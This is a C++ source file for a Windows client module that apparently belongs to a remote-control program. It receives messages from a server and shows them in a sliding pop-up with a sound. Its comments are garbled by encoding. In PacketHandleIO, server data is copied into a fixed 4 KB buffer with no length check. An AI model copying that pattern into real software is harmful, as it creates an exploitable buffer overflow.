#include "ClientInstantManager.h"
#include "Common.h"
#include "resource.h"
#include <mmsystem.h>

#pragma comment(lib, "WINMM.LIB")
extern HINSTANCE __InstanceHandle;
CHAR   __BufferData[0x1000] = { 0 };


#define WIN_WIDTH		220   
#define WIN_HEIGHT		150
#define ID_TIMER_POP_WINDOW		1
#define ID_TIMER_DELAY_DISPLAY	2 
#define ID_TIMER_CLOSE_WINDOW	3 

int    __TimeEvent = 0;
CIOCPClient* __ClientObject = NULL;
CClientInstantManager::CClientInstantManager(CIOCPClient* ClientObject):CManager(ClientObject)
{

	printf("���칹�캯��\r\n");

	BYTE	IsToken = CLIENT_INSTANT_MESSAGE_REPLY;      
	m_ClientObject->OnServerSending((char*)&IsToken, 1);

	__ClientObject = m_ClientObject;


	WaitForServerDialogOpen();   //�ú����Ǹ���
}


CClientInstantManager::~CClientInstantManager()
{
	printf("������������\r\n");
}

void CClientInstantManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}

	default:
	{
		memcpy(__BufferData, BufferData, BufferLength);

		//����һ��DLG


		//
		DialogBoxA(__InstanceHandle, MAKEINTRESOURCE(IDD_DIALOG_INSTANT_MESSAGE),
			NULL, DialogProcedure);  //SDK   C   MFC  C++
	}
	}

}

int CALLBACK DialogProcedure(HWND DlgHwnd, unsigned int Msg,
	WPARAM wParam, LPARAM lParam)
{

	switch (Msg)
	{
	case WM_TIMER:
	{
		OnTimerDialog(DlgHwnd);
		break;
	}
	case WM_INITDIALOG:
	{
		OnInitDialog(DlgHwnd);
		break;
	}
	}

	return 0;
}

VOID OnInitDialog(HWND DlgHwnd)
{
	MoveWindow(DlgHwnd, 0, 0, 0, 0, TRUE);

	SetDlgItemText(DlgHwnd, IDC_EDIT_INSTANT_MESSAGE_MAIN, __BufferData);

	memset(__BufferData, 0, sizeof(__BufferData));


	__TimeEvent = ID_TIMER_POP_WINDOW;
	SetTimer(DlgHwnd, __TimeEvent, 1, NULL);  //ʱ�ӻص�   

	PlaySound(MAKEINTRESOURCE(IDR_WAVE_INSTANT_MESSAGE),
		__InstanceHandle, SND_ASYNC | SND_RESOURCE | SND_NODEFAULT);
}
VOID OnTimerDialog(HWND DlgHwnd)   //ʱ�ӻص�
{
	RECT  Rect;
	static int Height = 0;
	SystemParametersInfo(SPI_GETWORKAREA, 0, &Rect, 0);
	int y = Rect.bottom - Rect.top;
	//int x = Rect.right - Rect.left ;
	//x = x - WIN_WIDTH;

	int x = 0;
	switch (__TimeEvent)
	{
	case ID_TIMER_CLOSE_WINDOW:
	{
		if (Height >= 0)
		{
			Height -= 5;
			MoveWindow(DlgHwnd, x, y - Height, WIN_WIDTH, Height, TRUE);
		}
		else
		{
			KillTimer(DlgHwnd, ID_TIMER_CLOSE_WINDOW);
			BYTE IsToken = CLIENT_INSTANT_MESSAGE_COMPLETE;				// ����ͷ�ļ� Common.h     
			__ClientObject->OnServerSending((char*)&IsToken, 1);		// �����������·��͵�ָ��
			EndDialog(DlgHwnd, 0);
		}
		break;
	}

	case ID_TIMER_DELAY_DISPLAY:
	{
		KillTimer(DlgHwnd, ID_TIMER_DELAY_DISPLAY);
		__TimeEvent = ID_TIMER_CLOSE_WINDOW;
		SetTimer(DlgHwnd, __TimeEvent, 5, NULL);
		break;
	}
	case ID_TIMER_POP_WINDOW:
	{
		if (Height <= WIN_HEIGHT)
		{
			Height += 3;
			MoveWindow(DlgHwnd, x, y - Height, WIN_WIDTH, Height, TRUE);
		}
		else
		{
			KillTimer(DlgHwnd, ID_TIMER_POP_WINDOW);
			__TimeEvent = ID_TIMER_DELAY_DISPLAY;
			SetTimer(DlgHwnd, __TimeEvent, 7000, NULL);
		}
		break;
	}
	}
}
